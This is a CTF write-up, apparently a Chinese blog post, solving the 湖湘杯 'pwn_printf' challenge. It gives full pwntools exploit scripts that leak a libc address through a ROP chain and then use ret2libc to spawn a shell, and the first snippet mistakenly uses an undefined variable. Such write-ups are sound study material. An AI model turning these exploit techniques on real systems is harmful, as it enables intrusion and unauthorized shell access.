---
title: 湖湘杯hxb_Pwn
categories: 
    - 比赛WriteUp
    - 湖湘杯
---


# 湖湘杯hxb_pwn
<!--more-->
## pwn_printf
### pwn_libc

ida


![在这里插入图片描述](https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)


16次循环
下面if判断v12<=0x20
所以写


```python
for i in range(16):
	n.sendline("32")
```

跟进if下面的函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201108200913518.png#pic_center)

这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。
再然后a * a1，所以传参需要double 0x20，也就是0x40
`ROPgadget --binary pwn_printf`
找到pop_rdi_ret的地址
复习一下libc64_payload公式


```python
64位payload: payload = "a"*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)
```


写exp：

```python
from pwn import *
sh = process('./pwn_printf')
elf = ELF('./pwn_printf')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x401213
for i in range(16):
	n.sendline("32")
payload = 'a' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(0x4007C6)
sh.send(payload)
sh.recvuntil('You will find this game very interesting\n')
puts_addr = u64(sh.recvn(6).ljust(8, '\x00'))
print(hex(puts_addr))
```

这就print出来了puts的地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201108201921266.png#pic_center)


到[libc database search](https://libc.blukat.me/)查一下相关libc信息

在套用一下公式

```python
libc_base = puts_addr - 0x080a30    # -libc_Offset的puts

system_addr = libc_base + 0x04f4e0   # +libc_Offset的system

bin_sh_addr = libc_base + 0x1b40fa		# +libc_Offset的bin/sh
```

复习一下libc64_getshell公式

```python
getshell: "a"*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)
```

完整exp：

```python
from pwn import *
sh = process('./pwn_printf')
elf = ELF('./pwn_printf')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x401213
for i in range(16):
	sh.sendline("32")
payload = 'a' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(0x4007C6)
sh.send(payload)
sh.recvuntil('You will find this game very interesting\n')
puts_addr = u64(sh.recvn(6).ljust(8, '\x00'))
print(hex(puts_addr))
libc_base = puts_addr - 0x080a30 #0x6f6a0
system_addr = libc_base + 0x04f4e0 #0x0453a0
bin_sh_addr = libc_base + 0x1b40fa #0x18ce17 
payload = 'a' * 8 + p64(0x4007C6) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)

sh.send(payload)

sh.interactive()
```
